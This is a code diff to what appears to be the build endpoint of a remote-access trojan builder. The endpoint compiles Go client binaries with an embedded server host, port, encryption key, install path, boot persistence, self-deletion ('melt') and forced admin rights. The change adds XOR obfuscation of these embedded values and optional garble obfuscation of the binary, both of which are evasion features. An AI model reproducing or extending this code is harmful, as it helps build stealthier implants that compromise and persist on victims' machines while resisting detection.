@@ -9,9 +9,11 @@ import { randomBytes } from 'node:crypto';
 import { type BuildRequest, type BuildResponse } from '../../../../../shared/types/build';
 import {
 	encodeRuntimeConfig,
+	generateXorKey,
 	hasFileInformationPayload,
 	mutexSanitizer,
 	normalizeBuildRequestPayload,
+	obfuscateString,
 	parseVersionParts,
 	sanitizeFileInformationPayload,
 	type NormalizedFileInformation
@@ -139,6 +141,20 @@ async function runCommand(
 	});
 }
 
+async function checkGarbleAvailability(): Promise<boolean> {
+	try {
+		const exitCode = await runCommand(
+			'garble',
+			['version'],
+			{ stdio: ['ignore', 'ignore', 'ignore'] },
+			[]
+		);
+		return exitCode === 0;
+	} catch {
+		return false;
+	}
+}
+
 async function compressBinaryWithUpx(
 	binaryPath: string,
 	output: string[],
@@ -243,6 +259,7 @@ export const POST: RequestHandler = async ({ request }) => {
 		developerMode,
 		mutexName,
 		compressBinary,
+		obfuscateBinary,
 		forceAdmin,
 		pollIntervalMs,
 		maxBackoffMs,
@@ -283,14 +300,16 @@ export const POST: RequestHandler = async ({ request }) => {
 		}
 		const tempBinaryPath = join(tempDir, outputFilename);
 
+		const buildXorKey = generateXorKey();
 		const ldflagsParts = [
-			`-X main.defaultServerHostEncoded=${encodeBase64(host)}`,
-			`-X main.defaultServerPortEncoded=${encodeBase64(port)}`,
-			`-X main.defaultInstallPathEncoded=${encodeBase64(installationPath)}`,
-			`-X main.defaultEncryptionKeyEncoded=${encodeBase64(sharedSecret)}`,
+			`-X main.defaultBuildXorKey=${buildXorKey}`,
+			`-X main.defaultServerHostEncoded=${obfuscateString(host, buildXorKey)}`,
+			`-X main.defaultServerPortEncoded=${obfuscateString(port, buildXorKey)}`,
+			`-X main.defaultInstallPathEncoded=${obfuscateString(installationPath, buildXorKey)}`,
+			`-X main.defaultEncryptionKeyEncoded=${obfuscateString(sharedSecret, buildXorKey)}`,
 			`-X main.defaultMeltAfterRun=${meltAfterRun ? 'true' : 'false'}`,
 			`-X main.defaultStartupOnBoot=${startupOnBoot ? 'true' : 'false'}`,
-			`-X main.defaultMutexKeyEncoded=${encodeBase64(mutexName)}`,
+			`-X main.defaultMutexKeyEncoded=${obfuscateString(mutexName, buildXorKey)}`,
 			`-X main.defaultForceAdminRequirement=${forceAdmin ? 'true' : 'false'}`
 		];
 
@@ -402,9 +421,23 @@ export const POST: RequestHandler = async ({ request }) => {
 			}
 		}
 
+		let buildCommand = 'go';
+		let buildArgs = [...goArgs];
+
+		if (obfuscateBinary) {
+			const garbleAvailable = await checkGarbleAvailability();
+			if (garbleAvailable) {
+				const buildSeed = randomBytes(16).toString('hex');
+				buildCommand = 'garble';
+				buildArgs = ['-tiny', `-seed=${buildSeed}`, ...goArgs];
+			} else {
+				warnings.push('Obfuscation skipped: garble binary is not available in the build environment.');
+			}
+		}
+
 		const exitCode = await runCommand(
-			'go',
-			goArgs,
+			buildCommand,
+			buildArgs,
 			{
 				cwd: workDir,
 				env: goEnv,
